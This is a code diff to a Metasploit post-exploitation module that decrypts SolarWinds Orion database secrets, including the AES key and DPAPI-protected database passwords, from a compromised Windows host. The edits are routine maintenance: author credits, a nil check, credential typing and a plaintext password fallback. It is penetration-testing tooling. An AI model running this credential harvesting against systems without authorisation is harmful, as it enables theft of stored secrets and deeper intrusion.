@@ -29,7 +29,10 @@ class MetasploitModule < Msf::Post
           of the source code and technical information published by Djordje Atlialp and
           Atredis Partners.
         },
-        'Author' => [ 'npm[at]cesium137.io', 'djordje.atlialp@gmail.com', 'https://atredis.com' ],
+        'Author' => [
+          'npm[at]cesium137.io', # Metasploit Module
+          'djordje.atlialp@gmail.com' # @rhazdon - Original research
+        ],
         'Platform' => [ 'win' ],
         'DisclosureDate' => '2022-11-08',
         'SessionTypes' => [ 'meterpreter' ],
@@ -171,6 +174,8 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_orion_db(csv_dataset)
+    fail_with(Msf::Exploit::Failure::Unknown, 'Dataset contains no column values') unless csv_dataset
+
     current_row = 0
     decrypted_rows = 0
     plaintext_rows = 0
@@ -382,18 +387,7 @@ class MetasploitModule < Msf::Post
     end
     print_good('Orion AES Encryption Key')
     print_good("\tHEX: #{orion_aes_key_hex}")
-    extra_service_data = {
-      address: ::Rex::Socket.getaddress(rhost),
-      port: 17777,
-      service_name: 'sis',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id,
-      module_fullname: fullname,
-      origin_type: :service,
-      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-      realm_value: ::Rex::Socket.getaddress(rhost)
-    }
-    store_valid_credential(user: 'Orion NPM AES Key', private: orion_aes_key_hex, service_data: extra_service_data)
+    store_valid_credential(user: 'Orion NPM AES Key', private: orion_aes_key_hex, private_type: :nonreplayable_hash)
     get_orion_certificate
     unless @orion_rsa_key
       print_warning('Unable to locate SolarWinds encryption certificate - secrets encrypted with RSA will not be decrypted')
@@ -417,7 +411,7 @@ class MetasploitModule < Msf::Post
       db_user = db_conf['USER ID']
       db_pass_enc = db_conf['ENCRYPTED.PASSWORD']
       if db_pass_enc.nil?
-        db_pass = nil
+        db_pass = db_conf['PASSWORD']
       else
         db_pass = ::Base64.strict_decode64(dpapi_decrypt(db_pass_enc.gsub('"', ''), 'AgABAgADAAk=')) # static entropy
       end
